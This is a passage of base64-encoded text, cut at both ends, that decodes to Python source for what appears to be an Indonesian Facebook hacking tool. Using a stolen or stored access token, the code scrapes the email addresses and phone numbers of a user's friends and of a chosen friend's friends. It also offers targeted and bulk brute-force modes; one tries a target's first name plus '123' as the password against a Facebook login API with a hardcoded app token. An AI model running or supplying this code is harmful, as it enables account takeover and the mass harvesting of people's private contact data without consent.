aW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiIKCQlrZWx1YXIoKQoJCQojIyMjIyBFTUFJTCAjIyMjIwpkZWYgZW1haWwoKToKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCgl0cnk6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQgbG9nbwoJCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScrdG9rZXQpCgkJYSA9IGpzb24ubG9hZHMoci50ZXh0KQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBhbGwgZnJpZW5kIGVtYWlsIFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWJ6ID0gb3Blbignb3V0L2VtYWlsX3RlbWFuLnR4dCcsJ3cnKQoJCWZvciBpIGluIGFbJ2RhdGEnXToKCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJdHJ5OgoJCQkJZW0uYXBwZW5kKHpbJ2VtYWlsJ10pCgkJCQliei53cml0ZSh6WydlbWFpbCddICsgJ1xuJykKCQkJCXByaW50ICgiXHJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtIitzdHIobGVuKGVtKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIit6WydlbWFpbCddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQoJCQlleGNlcHQgS2V5RXJyb3I6CgkJCQlwYXNzCgkJYnouY2xvc2UoKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IGVtYWlsIFwwMzNbMTs5N20uLi4uJwoJCXByaW50IlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgRW1haWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKGVtKSkKCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpCgkJb3MucmVuYW1lKCdvdXQvZW1haWxfdGVtYW4udHh0Jywnb3V0LycrZG9uZSkKCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCgkJa2VsdWFyKCkKCiMjIyMjIEVNQUlMIEZST00gVEVNQU4gIyMjIyMKZGVmIGVtYWlsZnJvbV90ZW1hbigpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJdHJ5OgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IGxvZ28KCQlpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGZyaWVuZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikKCQl0cnk6CgkJCWpvayA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkKCQkJb3AgPSBqc29uLmxvYWRzKGpvay50ZXh0KQoJCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIitvcFsibmFtZSJdCgkJZXhjZXB0IEtleUVycm9yOgoJCQlwcmludCJcMDMzWzE7OTFtWyFdIEZyaWVuZCBub3QgZm91bmQiCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCWR1bXAoKQoJCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWR0KycvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlhID0ganNvbi5sb2FkcyhyLnRleHQpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGFsbCBmcmllbmQgZW1haWwgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJYnogPSBvcGVuKCdvdXQvZW1fdGVtYW5fZnJvbV90ZW1hbi50eHQnLCd3JykKCQlmb3IgaSBpbiBhWydkYXRhJ106CgkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraVsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCXRyeToKCQkJCWVtZnJvbXRlbWFuLmFwcGVuZCh6WydlbWFpbCddKQoJCQkJYnoud3JpdGUoelsnZW1haWwnXSArICdcbicpCgkJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihlbWZyb210ZW1hbikpKyJcMDMzWzE7OTdtIF1cMDMzWzE7OTdtPT4gXDAzM1sxOzk3bSIrelsnZW1haWwnXSsiIHwgIit6WyduYW1lJ10rIlxuIiksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKCQkJZXhjZXB0IEtleUVycm9yOgoJCQkJcGFzcwoJCWJ6LmNsb3NlKCkKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCAnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtU3VjY2Vzc2Z1bGx5IGdldCBlbWFpbCBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIEVtYWlsIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlKGxlbihlbWZyb210ZW1hbikpCgkJZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQoJCW9zLnJlbmFtZSgnb3V0L2VtX3RlbWFuX2Zyb21fdGVtYW4udHh0Jywnb3V0LycrZG9uZSkKCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCgkJa2VsdWFyKCkKCQkKIyMjIyMgTk9NRVIgIyMjIyMKZGVmIG5vbW9yX2hwKCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCgl0cnk6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQgbG9nbwoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBhbGwgZnJpZW5kIG51bWJlciBwaG9uZSBcMDMzWzE7OTdtLi4uJykKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQl1cmw9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0iK3Rva2V0CgkJciA9cmVxdWVzdHMuZ2V0KHVybCkKCQl6PWpzb24ubG9hZHMoci50ZXh0KQoJCWJ6ID0gb3Blbignb3V0L25vbWVyX3RlbWFuLnR4dCcsJ3cnKQoJCWZvciBuIGluIHpbImRhdGEiXToKCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIituWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJdHJ5OgoJCQkJaHAuYXBwZW5kKHpbJ21vYmlsZV9waG9uZSddKQoJCQkJYnoud3JpdGUoelsnbW9iaWxlX3Bob25lJ10gKyAnXG4nKQoJCQkJcHJpbnQgKCJcclwwMzNbMTs5N21bIFwwMzNbMTs5Mm0iK3N0cihsZW4oaHApKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK3pbJ21vYmlsZV9waG9uZSddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQoJCQlleGNlcHQgS2V5RXJyb3I6CgkJCQlwYXNzCgkJYnouY2xvc2UoKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IG51bWJlciBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIE51bWJlciBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4oaHApKQoJCWRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikKCQlvcy5yZW5hbWUoJ291dC9ub21lcl90ZW1hbi50eHQnLCdvdXQvJytkb25lKQoJCXByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiIKCQlrZWx1YXIoKQoKIyMjIyMgTk9NRVIgRlJPTSBURU1BTiAjIyMjIwpkZWYgaHBmcm9tX3RlbWFuKCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCgl0cnk6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQgbG9nbwoJCWlkdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZnJpZW5kIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQoJCXRyeToKCQkJam9rID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQlvcCA9IGpzb24ubG9hZHMoam9rLnRleHQpCgkJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiK29wWyJuYW1lIl0KCQlleGNlcHQgS2V5RXJyb3I6CgkJCXByaW50IlwwMzNbMTs5MW1bIV0gRnJpZW5kIG5vdCBmb3VuZCIKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJZHVtcCgpCgkJciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZHQrJy9mcmllbmRzP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJCWEgPSBqc29uLmxvYWRzKHIudGV4dCkKCQlqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGZyaWVuZCBudW1iZXIgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJYnogPSBvcGVuKCdvdXQvbm9fdGVtYW5fZnJvbV90ZW1hbi50eHQnLCd3JykKCQlmb3IgaSBpbiBhWydkYXRhJ106CgkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraVsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCXRyeToKCQkJCWhwZnJvbXRlbWFuLmFwcGVuZCh6Wydtb2JpbGVfcGhvbmUnXSkKCQkJCWJ6LndyaXRlKHpbJ21vYmlsZV9waG9uZSddICsgJ1xuJykKCQkJCXByaW50ICgiXHJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtIitzdHIobGVuKGhwZnJvbXRlbWFuKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIit6Wydtb2JpbGVfcGhvbmUnXSsiIHwgIit6WyduYW1lJ10rIlxuIiksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKCQkJZXhjZXB0IEtleUVycm9yOgoJCQkJcGFzcwoJCWJ6LmNsb3NlKCkKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCAnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtU3VjY2Vzc2Z1bGx5IGdldCBudW1iZXIgXDAzM1sxOzk3bS4uLi4nCgkJcHJpbnQiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBOdW1iZXIgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKGhwZnJvbXRlbWFuKSkKCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpCgkJb3MucmVuYW1lKCdvdXQvbm9fdGVtYW5fZnJvbV90ZW1hbi50eHQnLCdvdXQvJytkb25lKQoJCXByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiIKCQlrZWx1YXIoKQogICAgCiMjIyMjIE1FTlUgSEFDSyAjIyMjIwpkZWYgbWVudV9oYWNrKCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTNt4pWRLS1cMDMzWzE7OTNtPiBcMDMzWzE7OTNtMS5cMDMzWzE7OTRtIE1pbmkgSGFjayBGYWNlYm9vayhcMDMzWzE7OTJtVGFyZ2V0XDAzM1sxOzk3bSkiCglwcmludCAiXDAzM1sxOzkzbeKVkS0tXDAzM1sxOzkzbT4gXDAzM1sxOzkzbTIuXDAzM1sxOzk0bSBNdWx0aSBCcnV0ZWZvcmNlIEZhY2Vib29rIgoJcHJpbnQgIlwwMzNbMTs5M23ilZEtLVwwMzNbMTs5M20+IFwwMzNbMTs5M20zLlwwMzNbMTs5NG0gU3VwZXIgTXVsdGkgQnJ1dGVmb3JjZSBGYWNlYm9vayIKCXByaW50ICJcMDMzWzE7OTNt4pWRLS1cMDMzWzE7OTNtPiBcMDMzWzE7OTNtNC5cMDMzWzE7OTRtIEJydXRlRm9yY2UoXDAzM1sxOzkybVRhcmdldFwwMzNbMTs5N20pIgoJcHJpbnQgIlwwMzNbMTs5M23ilZEtLVwwMzNbMTs5M20+IFwwMzNbMTs5M201LlwwMzNbMTs5NG0gWWFob28gQ2hlY2tlciIKCXByaW50ICJcMDMzWzE7OTNt4pWRLS1cMDMzWzE7OTNtPiBcMDMzWzE7OTNtMC5cMDMzWzE7OTRtIEJhY2siCglwcmludCAi4pWRIgoJaGFja19waWxpaCgpCiMtLS0tcGlsaWgKZGVmIGhhY2tfcGlsaWgoKToKCWhhY2sgPSByYXdfaW5wdXQoIlwwMzNbMTs5NW3ilZrilZBcMDMzWzE7OTVtRCBcMDMzWzE7OTVtIikKCWlmIGhhY2s9PSIiOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCWhhY2tfcGlsaWgoKQoJZWxpZiBoYWNrID09IjEiOgoJCW1pbmkoKQoJZWxpZiBoYWNrID09IjIiOgoJCWNyYWNrKCkKCQloYXNpbCgpCgllbGlmIGhhY2sgPT0iMyI6CgkJc3VwZXIoKQoJZWxpZiBoYWNrID09IjQiOgoJCWJydXRlKCkKCWVsaWYgaGFjayA9PSI1IjoKCQltZW51X3lhaG9vKCkKCWVsaWYgaGFjayA9PSIwIjoKCQltZW51KCkKCWVsc2U6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJaGFja19waWxpaCgpCgkJCiMjIyMjIE1JTkkgSEYgIyMjIyMKZGVmIG1pbmkoKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlwwMzNbMTs5N21bXDAzM1sxOzkxbUlORk9cMDMzWzE7OTdtXSBcMDMzWzE7OTFtVGhlIHRhcmdldCBhY2NvdW50IG11c3QgYmUgZnJpZW5kc1xuICAgICAgIHdpdGggeW91ciBhY2NvdW50IGZpcnN0ISIKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJdHJ5OgoJCWlkID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1UYXJnZXQgSUQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtV2FpdCBhIG1pbnV0ZSBcMDMzWzE7OTdtLi4uJykKCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJYSA9IGpzb24ubG9hZHMoci50ZXh0KQoJCXByaW50ICdcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtIDogJythWyduYW1lJ10KCQlqYWxhbignXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtQ2hlY2sgXDAzM1sxOzk3bS4uLicpCgkJdGltZS5zbGVlcCgyKQoJCWphbGFuKCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1PcGVuIHBhc3N3b3JkIFwwMzNbMTs5N20uLi4nKQoJCXRpbWUuc2xlZXAoMikKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwejEgPSBhWydmaXJzdF9uYW1lJ10rJzEyMycKCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhpZCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHoxKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQl5ID0ganNvbi5sb2FkKGRhdGEpCgkJaWYgJ2FjY2Vzc190b2tlbicgaW4geToKCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgoJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCgkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJcHJpbnQgIlwwMzNbMTs